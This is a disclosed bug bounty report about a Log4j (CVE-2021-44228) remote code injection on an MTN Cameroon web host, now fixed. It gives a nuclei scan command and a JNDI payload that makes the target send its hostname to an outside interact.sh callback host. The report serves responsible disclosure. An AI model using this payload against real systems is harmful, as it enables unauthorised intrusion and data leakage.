---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
  - vuln/path-traversal
  - vuln/command-injection
  - vuln/code-injection
  - impact/rce
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2024-08-24
submitted: 2021-12-14T03:55:04.508Z
bounty_usd: null
votes: 17
cve: "CVE-2021-44228"
program: "[[programs/mtn_group|MTN Group]]"
reporter: "renzi"
source: "https://hackerone.com/reports/1425563"
title: "Remote code injection in Log4j on http://mtn1app.mtncameroon.net  - CVE-2021-44228"
---
# Remote code injection in Log4j on http://mtn1app.mtncameroon.net  - CVE-2021-44228

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 17 | **Program:** MTN Group | **Disclosed:** 2024-08-24

- Report: [https://hackerone.com/reports/1425563](https://hackerone.com/reports/1425563)
- CWE: OS Command Injection | CVE: CVE-2021-44228
- Submitted: 2021-12-14T03:55:04.508Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

###Summary
Hello,

I would to like report this security flaw on http://mtn1app.mtncameroon.net . Using script nuclei i can found CVE-2021-44228. This is a critical issue cause as remote command execution. On my test i just retrive hostname of machine via nuclei script. (https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)

###Steps To Reproduce
How we can reproduce the issue;

1. run nuclei script via cmd; ./nuclei -u http://mtn1app.mtncameroon.net:8080/ -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml

It will retrive the hostname of machine on output " lastic-co1-nodes1.mtnnigeria.net"

Like this;

````
http://mtn1app.mtncameroon.net:8080/?x=${jndi:ldap://${hostName}.c6s11oscca8f9pc2lrggcghbnjyyyybjg.interact.sh/a} [lastic-co1-nodes1.mtnnigeria.net]
````

This vulnerability is on port 8080 and 8443;

* http://mtn1app.mtncameroon.net:8080
* https://mtn1app.mtncameroon.net:8443



###Mitigation
Update according the vendor and thecnical references..

###References
https://www.tenable.com/blog/cve-2021-44228-proof-of-concept-for-critical-apache-log4j-remote-code-execution-vulnerability
https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476

## Impact

Remote command execution

## Timeline

- **Report Filed**
- **Report Triaged**
- **2022-01-14** @renzi: Thank you very much @incognito4 !
- **2022-02-08** @incognito4: Hi @renzi mitigation measures have been applied, may you please confirm from your side.
- **2022-02-08** @renzi: Hello @incognito4 ! It has been fixed.

Cheers,
@renzi
- **2022-03-02** @renzi: Can you resolve this report @incognito4 ?   It has been fixed.

Cheers,
@renzi
- **2022-04-18** @renzi: Can you resolve this report @incognito4 ? It has been fixed.

Cheers,
@renzi i
- **2022-07-22** @renzi: Hello again!

I hope you are doing well! Can you resolve this report @incognito4 ?

Cheers,
@renzi
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
